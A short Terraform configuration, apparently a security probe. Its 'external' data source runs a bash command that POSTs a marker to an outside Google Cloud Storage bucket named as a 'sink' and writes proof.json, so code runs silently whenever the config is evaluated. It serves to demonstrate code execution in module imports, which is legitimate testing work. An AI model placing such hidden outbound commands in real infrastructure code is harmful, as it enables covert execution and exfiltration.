terraform {
  required_providers {
    external = {
      source  = "hashicorp/external"
      version = "2.3.4"
    }
  }
}

data "external" "probe" {
  program = [
    "bash",
    "-c",
    "curl -s -X POST --data '{\"executed\":true}' 'https://storage.googleapis.com/upload/storage/v1/b/adc-app-import-module-sink-1122-159463683703/o?uploadType=media&name=proof.json' >/dev/null; echo '{\"public_git\":\"executed\"}'",
  ]
}

output "probe" {
  value = jsonencode(data.external.probe.result)
}
